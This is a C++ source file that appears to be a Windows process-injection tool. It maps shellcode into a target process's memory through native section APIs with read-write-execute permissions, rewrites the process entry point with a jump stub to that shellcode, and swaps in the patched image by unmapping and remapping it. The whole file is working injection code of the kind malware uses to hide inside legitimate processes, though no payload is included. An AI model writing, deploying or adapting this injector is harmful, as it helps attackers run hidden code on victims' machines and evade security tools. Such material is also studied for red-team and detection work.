#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include "NativeAPI.h"

using namespace std;

#pragma comment(lib, "ntdll")

#define SECTION_SIZE 0x1000
#define STATUS_SUCCESS 0

HMODULE hNTDLL = GetModuleHandleA("ntdll");
NtCreateSection pNtCreateSection = (NtCreateSection)(GetProcAddress(hNTDLL, "NtCreateSection"));
NtMapViewOfSection pNtMapViewOfSection = (NtMapViewOfSection)(GetProcAddress(hNTDLL, "NtMapViewOfSection"));
NtUnmapViewOfSection pNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(hNTDLL, "NtUnmapViewOfSection"));

IMAGE_DOS_HEADER* DosHeader = NULL;//
IMAGE_NT_HEADERS64* NtHeaders = NULL;//

DWORD64 CryGetImageSize(uint8_t* ProcessImage) {
	DosHeader = (IMAGE_DOS_HEADER*)ProcessImage;
	NtHeaders = (IMAGE_NT_HEADERS64*)((uint8_t*)ProcessImage + DosHeader->e_lfanew);
	cout << "[+]Image Size is " << NtHeaders->OptionalHeader.SizeOfImage << endl;
	return NtHeaders->OptionalHeader.SizeOfImage;
}

DWORD64 CryGetEntry(uint8_t* ProcessImage) {
	DosHeader = (IMAGE_DOS_HEADER*)ProcessImage;
	NtHeaders = (IMAGE_NT_HEADERS64*)((uint8_t*)ProcessImage + DosHeader->e_lfanew);
	return NtHeaders->OptionalHeader.AddressOfEntryPoint; //
}

PVOID CryShellInject(HANDLE hProcess, unsigned char* shellcode, SIZE_T shellsize) {
	LARGE_INTEGER SectionSize = { shellsize };
	HANDLE SectionHandle = NULL;
	PVOID LocalSectionAddress = NULL, RemoteSectionAddress = NULL;
	NTSTATUS StSectionCreate = pNtCreateSection(&SectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&SectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(StSectionCreate)) {
		cerr << "[x]Create Section Failed. 0x" << StSectionCreate << endl;
		return NULL;
	}
	NTSTATUS StLocalMap = pNtMapViewOfSection(SectionHandle, GetCurrentProcess(), &LocalSectionAddress, NULL, NULL, NULL, &shellsize, 2, NULL, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(StLocalMap)) {
		cerr << "[x]Local MapSection Failed 0x" << StLocalMap << endl;
		CloseHandle(SectionHandle);
		return NULL;
	}
	NTSTATUS StRemoteMap = pNtMapViewOfSection(SectionHandle, hProcess, &RemoteSectionAddress, NULL, NULL, NULL, &shellsize, 2, NULL, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(StRemoteMap)) {
		cerr << "[x]Remote MapSection Failed 0x" << StRemoteMap << endl;
		CloseHandle(SectionHandle);
		return NULL;
	}

	memcpy(LocalSectionAddress, shellcode, shellsize);
	cout << "[!]Shellcode injected into 0x" << hex << (DWORD64)RemoteSectionAddress << endl;

	CloseHandle(SectionHandle);
	return RemoteSectionAddress;
}

PVOID CryEntryPatch(HANDLE hProcess, LPVOID BaseAddress, PVOID shellcodeaddress) {
	SIZE_T BytesRead = 0;
	uint8_t* ImageData = new(uint8_t[SECTION_SIZE]);

	if (!ReadProcessMemory(hProcess, (LPCVOID)BaseAddress, ImageData, SECTION_SIZE, &BytesRead) && BytesRead != SECTION_SIZE) {
		cerr << "[-]Failed to read Headers. " << GetLastError() << endl;
		return NULL;
	}
	DWORD64 SizeOfImage = CryGetImageSize(ImageData);
	delete[] ImageData;
	uint8_t* ProcessImage = new(uint8_t[SizeOfImage]);
	if (!ReadProcessMemory(hProcess, (LPCVOID)BaseAddress, ProcessImage, SizeOfImage, &BytesRead) && BytesRead != SizeOfImage) {
		cerr << "[-]Failed to Read Image." << GetLastError() << endl;
		return NULL;
	}
	uintptr_t EntryPoint = CryGetEntry(ProcessImage);
	cout << "[+]EntryPoint is 0x" << hex << (DWORD64)BaseAddress + EntryPoint << endl;

	memset(ProcessImage + EntryPoint, 0x90, 12);
	DWORD64 ProcessEntry = (DWORD64)BaseAddress + EntryPoint;
	ProcessImage[EntryPoint + 0] = 0x48;
	ProcessImage[EntryPoint + 1] = 0xB8;
	*(uintptr_t*)(ProcessImage + EntryPoint + 2) = (uintptr_t)shellcodeaddress;
	ProcessImage[EntryPoint + 10] = 0xFF;
	ProcessImage[EntryPoint + 11] = 0xE0;

	LARGE_INTEGER sectionsize = { SizeOfImage };
	HANDLE sectionhandle = NULL;
	PVOID sectionaddress = NULL;
	NTSTATUS StSecCreate = pNtCreateSection(&sectionhandle, SECTION_ALL_ACCESS, NULL, &sectionsize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(StSecCreate)) {
		cerr << "[-]NtCreateSection Failed. 0x" << StSecCreate << std::endl;
		return NULL;
	}
	NTSTATUS StLocalMap = pNtMapViewOfSection(sectionhandle, GetCurrentProcess(), &sectionaddress, NULL, NULL, NULL, &BytesRead, 2, NULL, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(StLocalMap)) {
		cerr << "[-]Local MapSection Failed" << StLocalMap << endl;
		CloseHandle(sectionhandle);
		return NULL;
	}

	cout << "[!]Replace Patched Process Image at 0x" << hex << BaseAddress << endl;
	memcpy(sectionaddress, ProcessImage, SizeOfImage);
	sectionaddress = BaseAddress;
	NTSTATUS StUnmap = pNtUnmapViewOfSection(hProcess, sectionaddress);
	if (!NT_SUCCESS(StUnmap)) {
		cerr << "[-]Image unmap failed 0x" << StUnmap << endl;
		CloseHandle(sectionhandle);
		return NULL;
	}
	NTSTATUS StRemap = pNtMapViewOfSection(sectionhandle, hProcess, &sectionaddress, NULL, NULL, NULL, &BytesRead, 2, NULL, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(StRemap)) {
		cerr << "[-]Remap patched image to target process failed 0x" << StRemap << endl;
		CloseHandle(sectionhandle);
		return NULL;
	}
	CloseHandle(sectionhandle);

	delete[] ProcessImage;
	return (PVOID)ProcessEntry;
}